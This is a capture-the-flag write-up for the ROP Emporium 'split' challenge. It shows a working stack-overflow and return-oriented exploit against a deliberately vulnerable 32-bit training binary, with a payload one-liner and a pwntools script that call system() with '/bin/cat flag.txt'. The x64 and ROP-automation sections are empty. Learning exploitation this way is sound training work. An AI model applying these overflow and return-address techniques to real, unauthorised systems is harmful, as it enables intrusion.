---
description: 09/23/2023
---

# ðŸ’” split

## Introduction

We can still use a similar methodology to complete this challenge and this is still a _**ret2win**_, <mark style="color:yellow;">but with a bit of a twist</mark>.

## Challenge

{% embed url="https://ropemporium.com/challenge/split.html" %}

### Hint

The challenge author told us that the string <mark style="color:yellow;">`"/bin/cat flag.txt"`</mark> is still present in the binary.

Also, a call to <mark style="color:yellow;">`system()`</mark> is present as well.

<mark style="color:yellow;">We simply need to chain them together to exploit our binary</mark>.

## References

{% embed url="https://github.com/radareorg/radare2/blob/master/doc/intro.md" %}

## x86 Exploitation

### Enumeration

`file`:

{% code overflow="wrap" %}
```
split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped
```
{% endcode %}

* <mark style="color:yellow;">32-bit</mark>
* <mark style="color:yellow;">dynamically linked</mark>
* <mark style="color:yellow;">not stripped</mark>

`checksec`:

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

* <mark style="color:green;">NX enabled</mark>, making ROP a great technique

`rabin2`:

```
rabin2 -I split

arch     x86
baddr    0x8048000
binsz    6256
bintype  elf
bits     32
canary   false
injprot  false
class    ELF32
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

{% code overflow="wrap" %}
```
rabin2 -iz split32  
                                                                                                                        [Imports]                                                                                                                                                            nth vaddr      bind   type   lib name                                                                                                                                â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•                                                                                                                                1   0x080483b0 GLOBAL FUNC       read                                                                                                                                2   0x080483c0 GLOBAL FUNC       printf                                                                                                                              3   0x080483d0 GLOBAL FUNC       puts                                                                                                                                4   0x080483e0 GLOBAL FUNC       system                                                                                                                              5   0x00000420 WEAK   NOTYPE     __gmon_start__                                                                                                                      6   0x080483f0 GLOBAL FUNC       __libc_start_main                                                                                                                   7   0x08048400 GLOBAL FUNC       setvbuf                                                                                                                             8   0x08048410 GLOBAL FUNC       memset                                                                                                                                                                                                                                                                                                   [Strings]                                                                                                                                                            nth paddr      vaddr      len size section type  string                                                                                                              â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•                                                                                                              0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium                                                                                               1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n                                                                                                               2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting                                                                                                           3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...                                                                         4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!                                                                                                          5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls                                                                                                             0   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat flag.txt
```
{% endcode %}

The `-iz` argument will show us strings in the data section of the specified binary.

* We can see a <mark style="color:yellow;">function call to</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`system()`</mark>
* Inside of the <mark style="color:yellow;">data section of the ELF, we can see the string</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`"/bin/cat flag.txt"`</mark>

**NOTE**: These are the two pieces of the puzzle that we need to "chain" together to _**ret2win**_.

### Reversing

I always want to view the disassembly of the functions to get as close to the source code to try and paint the picture as much as possible to know what is going on.&#x20;

I wanted to switch some things up and use **IDA** for this one to gain some more versatility.

It took a little bit of time to get used to, but I think I'll be using it from time to time.

**So, let's begin with looking at the functions within the target binary:**

`main()`:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  puts("split by ROP Emporium");
  puts("x86\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

`pwnme()`:

```c
int pwnme()
{
  char v1[40]; // [esp+0h] [ebp-28h] BYREF

  memset(v1, 0, 32);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0, v1, 96);
  return puts("Thank you!");
}
```

`usefulFunction()`:

```c
int usefulFunction()
{
  return system("/bin/ls");
}
```

So, the goal here is to replace the system("/bin/ls") call with system("/bin/cat flag.txt")

**We can also see this in IDA using the Strings tab:**

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption><p>strings</p></figcaption></figure>

### Manual Exploitation

We will be using lots of `pwndbg` on this step.

NOTE: You can get most of this information from **IDA** as well but I prefer `pwndbg` at this step.

**Viewing the disassembly of `usefulFunction()`:**

```
disass usefulFunction

Dump of assembler code for function usefulFunction:
   0x0804860c <+0>:     push   ebp
   0x0804860d <+1>:     mov    ebp,esp
   0x0804860f <+3>:     sub    esp,0x8
   0x08048612 <+6>:     sub    esp,0xc
   0x08048615 <+9>:     push   0x804870e
   0x0804861a <+14>:    call   0x80483e0 <system@plt>
   0x0804861f <+19>:    add    esp,0x10
   0x08048622 <+22>:    nop
   0x08048623 <+23>:    leave
   0x08048624 <+24>:    ret
End of assembler dump.
```

**The `system()` call address:**

```
0x0804861a
```

We also want the offset of the string `"/bin/cat flag.txt"`.

**Set a breakpoint at main and run the program:**

```
b main
r
```

Now that we have the program running in memory, we can search for "/bin/cat flag.txt":

```
search /bin/cat

Searching for value: '/bin/cat'
split32         0x804a030 '/bin/cat flag.txt'
```

* Making our offset `0x804a030`

**Okay, our next goal is to find the offset to the instruction pointer using a cyclic pattern of 100 bytes:**

```
cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
c
<send input>
```

**This will obviously crash the program, and allow us to find the offset to the instruction pointer:**

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>Finding offset to the instruction pointer</p></figcaption></figure>

**We can grab the offset by:**

```
cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

We find that we had to write **44 bytes** to the buffer to begin overwriting the return pointer.

#### Building out our payload manually:

**Payload layout:**

<mark style="color:green;">Padding (44) +</mark> <mark style="color:green;"></mark><mark style="color:green;">`system()`</mark> <mark style="color:green;"></mark><mark style="color:green;">+</mark> <mark style="color:green;"></mark><mark style="color:green;">`"/bin/cat flag.txt"`</mark>

`system()`:&#x20;

```
0x0804861a
```

`"/bin/cat flag.txt"`:

```
0x804a030
```

**We need to now place them in **<mark style="color:yellow;">**little-endian**</mark>** format for our payload:**

<pre><code><strong>system(): 0x0804861a -> \x1a\x86\x04\x08
</strong>
"/bin/cat flag.txt": 0x804a030 -> \x30\xa0\x04\x08
</code></pre>

**Utilizing `python3` to craft our payload and write it to a file named payload**:

```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\x1a\x86\x04\x08' + b'\x30\xa0\x04\x08')" > payload
```

**Execute the binary and send the payload to it:**

```
./split32 < payload
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption><p>Result</p></figcaption></figure>

**Visualize the payload in `pwndbg`:**

Obtain a clean instance of `pwndbg`.

**Set a breakpoint at `system()` and run while sending the payload in:**

```
b system
r < payload
```

**You can now see that we have a breakpoint at `system()`:**

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Continue execution:**

```
c
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption><p>Seeing <code>"/bin/cat flag.txt"</code> being placed onto the stack</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption><p>Seeing flag.txt in <code>pwndbg</code></p></figcaption></figure>

### Automating This Entire Process with pwntools

`exploit.py`:

* We can use `pwn template` to generate the setup for us

```python
from pwn import *

# SETUP

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
            return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
         return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Target binary
exe = './split32'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

#Delete core files once finished
context.delete_corefiles = True

# ===========================================================
#                     EXPLOIT GOES HERE
# ==========================================================

io = start()

# Locate the functions/strings we need
sys_addr = elf.symbols['system']
binCat_addr = next(elf.search(b'/bin/cat')) # Need to research next()

# Print out the target address
info("%#x system", sys_addr)
info("%#x /bin/cat", binCat_addr)

# Send a cyclic pattern of 100-bytes to the input of the target binary and overwrite the address on the stack
payload = cyclic(100)

# Send exploit
io.sendlineafter('>', payload)

# Wait for the process to crash
io.wait()

# Open the corefile
core = io.corefile

# Print out the address of EIP at the time of the crash (segfault)
eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('located EIP offset at {a}'.format(a=eip_offset))

# Craft a new payload which puts system('/bin/cat flag.txt') at the correct offset
# I need to research fit() not sure about how this works
payload = fit({
     eip_offset: [elf.symbols.system,
                  0x0,
                  binCat_addr]
} 
)

# Send payload to a new process
io = start()
io.sendline(payload)
io.recv()

# Grab flag.txt
flag = io.recvline()
success(flag)
```

<figure><img src="../../.gitbook/assets/image (152).png" alt=""><figcaption><p>Result</p></figcaption></figure>

### Automate Exploitation with ROP (Additional Automation)

`exploit.py`:



## x64 Exploitation

Coming soon.
